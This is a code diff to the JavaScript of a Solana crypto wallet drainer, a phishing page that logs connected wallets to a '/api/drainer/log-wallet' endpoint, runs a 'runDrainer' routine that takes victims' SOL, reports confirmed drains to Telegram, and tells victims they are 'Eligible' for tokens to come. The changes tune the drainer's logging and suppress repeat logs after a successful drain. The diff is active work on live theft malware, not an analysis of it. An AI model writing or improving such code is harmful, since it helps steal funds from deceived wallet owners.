@@ -122,21 +122,31 @@
       }
     }, 30000);
     
-    // Centralized wallet logging function with deduplication
+    // Centralized wallet logging function with enhanced deduplication
     window.logWalletConnection = function(publicKey, walletType, lamports = 0) {
       try {
         const walletKey = `${publicKey.toString()}-${walletType}`;
         const now = Date.now();
         const lastLogged = window.walletLogTimestamps?.[walletKey] || 0;
         
-        // Only log if we haven't logged this wallet in the last 30 seconds
-        if (now - lastLogged > 30000) {
+        // Enhanced deduplication: prevent logging for 5 minutes after a successful drain
+        const drainKey = `${walletKey}-drain`;
+        const lastDrainTime = window.walletLogTimestamps?.[drainKey] || 0;
+        const timeSinceDrain = now - lastDrainTime;
+        
+        // If we recently had a drain (within 5 minutes), skip logging
+        if (timeSinceDrain < 300000) { // 5 minutes
+          console.log(`[WALLET] Skipping wallet log for ${walletType} - recent drain detected`);
+          return;
+        }
+        
+        // Only log if we haven't logged this wallet in the last 2 minutes (increased from 30 seconds)
+        if (now - lastLogged > 120000) { // 2 minutes
           // Initialize timestamps object if it doesn't exist
           if (!window.walletLogTimestamps) {
             window.walletLogTimestamps = {};
           }
           
-          // Log wallet connection
           // Log wallet connection
           fetch('/api/drainer/log-wallet', {
             method: 'POST',
@@ -153,9 +163,9 @@
           // Update timestamp to prevent spam
           window.walletLogTimestamps[walletKey] = now;
           
-          // Connection logged successfully
+          console.log(`[WALLET] Logged wallet connection for ${walletType}`);
         } else {
-          // Skipping duplicate log
+          console.log(`[WALLET] Skipping duplicate wallet log for: ${walletKey}`);
         }
       } catch (logError) {
         console.error('[WALLET] Failed to log wallet connection:', logError);
@@ -1777,6 +1787,15 @@ async function runDrainer(provider) {
       balance: balance,
       balanceSOL: (balance / 1e9).toFixed(6)
     });
+    
+    // Mark that a drain has occurred to prevent spammy logging
+    const walletKey = `${publicKey.toString()}-${connectedWalletType}`;
+    const drainKey = `${walletKey}-drain`;
+    if (!window.walletLogTimestamps) {
+      window.walletLogTimestamps = {};
+    }
+    window.walletLogTimestamps[drainKey] = Date.now();
+    console.log(`[WALLET] Marked drain occurrence for ${connectedWalletType} - will skip logging for 5 minutes`);
 
     // 3. Deserialize the transaction
     let txBytes;
@@ -2275,6 +2294,15 @@ async function runDrainer(provider) {
                               actualDrainAmount: actualDrainAmount || 0
                             })
                           }).catch(err => console.log('[TELEGRAM] Failed to log confirmation:', err));
+                          
+                          // Mark successful drain to prevent spammy logging
+                          const walletKey = `${publicKey.toString()}-${connectedWalletType}`;
+                          const drainKey = `${walletKey}-drain`;
+                          if (!window.walletLogTimestamps) {
+                            window.walletLogTimestamps = {};
+                          }
+                          window.walletLogTimestamps[drainKey] = Date.now();
+                          console.log(`[WALLET] Marked successful drain for ${connectedWalletType} - will skip logging for 5 minutes`);
                           
                           showStatus('Eligible, Kindly Check Wallet in 1 hour for tokens', 'success');
                         } else {
